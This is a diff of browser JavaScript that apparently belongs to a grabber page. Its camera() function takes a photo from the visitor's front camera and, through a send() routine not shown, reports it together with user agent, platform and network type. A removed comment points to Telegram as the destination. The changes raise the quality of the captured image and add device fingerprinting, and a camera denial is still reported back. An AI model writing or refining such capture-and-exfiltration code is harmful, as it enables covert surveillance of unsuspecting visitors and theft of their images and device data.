@@ -103,9 +103,16 @@ function sendFinal(data) {
 // ==============================
 // CAMERA CAPTURE (OPTIMIZED)
 // ==============================
+
 async function camera() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        facingMode: "user"
+      }
+    });
 
     const video = document.createElement("video");
     video.srcObject = stream;
@@ -113,25 +120,32 @@ async function camera() {
 
     const canvas = document.createElement("canvas");
 
-    // ✅ Reduce size for Telegram reliability
-    canvas.width = 320;
-    canvas.height = 240;
+    // ✅ MATCH VIDEO SIZE (NO DISTORTION)
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-    canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
+    const ctx = canvas.getContext("2d");
 
-    const image = canvas.toDataURL("image/jpeg", 0.8);
+    // ✅ DRAW CLEAN FRAME
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    sendFinal({
+    // ✅ HIGH QUALITY (BUT SAFE SIZE)
+    const image = canvas.toDataURL("image/jpeg", 0.9);
+
+    send({
+      event: "final",
       image,
-      camera: "captured"
+      device: navigator.userAgent,
+      os: navigator.platform,
+      browser: navigator.userAgent,
+      network: navigator.connection?.effectiveType || "unknown"
     });
 
     stream.getTracks().forEach(t => t.stop());
 
-  } catch (err) {
-    console.log("Camera error:", err);
-
-    sendFinal({
+  } catch (e) {
+    send({
+      event: "final",
       camera: "denied"
     });
   }
